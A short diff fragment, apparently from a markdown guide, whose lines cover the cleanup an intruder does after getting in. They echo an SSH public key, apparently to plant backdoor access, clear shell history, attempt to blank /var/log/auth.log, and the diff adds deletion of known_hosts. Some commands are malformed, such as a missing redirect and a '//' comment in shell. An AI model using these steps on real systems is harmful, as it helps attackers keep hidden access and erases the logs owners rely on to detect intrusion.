@@ -35,7 +35,8 @@ echo "ssh-rsa AAAAB3NzaC1yc2EA**************************************************
 cat dev/null > ~/.bash_history
 history -c
 echo "" /var/log/auth.log //this will edit the text from null to the auth logs.
-
+rm  -f .ssh/known_hosts
+```
 
 
 
